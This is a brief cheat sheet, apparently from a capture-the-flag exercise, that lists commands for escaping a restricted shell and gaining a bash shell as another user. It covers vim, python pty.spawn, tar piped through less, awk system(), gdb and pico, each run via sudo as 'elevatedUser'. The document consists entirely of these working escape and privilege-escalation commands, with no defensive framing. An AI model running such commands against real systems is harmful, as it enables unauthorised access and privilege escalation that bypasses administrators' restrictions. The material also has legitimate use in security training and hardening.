#Restricted shell escape using Vim editor
vim
e
:set shell=/bin/bash
:shell

export PATH=$PATH:/bin:/usr/local/bin:/usr/bin:/usr/sbin:/usr/X11R6/bin:/home/ch14/bin


#Restricted shell escape using python
sudo -u elevatedUser "python"
import pty
pty.spawn("/bin/bash")


#Restricted shell escape using less command
sudo -u elevatedUser tar -P -c /dev/shm -I'less /challenge/app-script/ch14/.bashrc'
!/bin/bash


#Restricted shell escape using awk
sudo -u elevatedUser awk 'BEGIN {system("/bin/bash")}'


#Restricted shell escape using gdb
sudo -u elevatedUser gdb
shell


#Restricted shell escape using pico editor
sudo -u elevatedUser pico

	Ctrl+R
	Ctrl+X
		screen
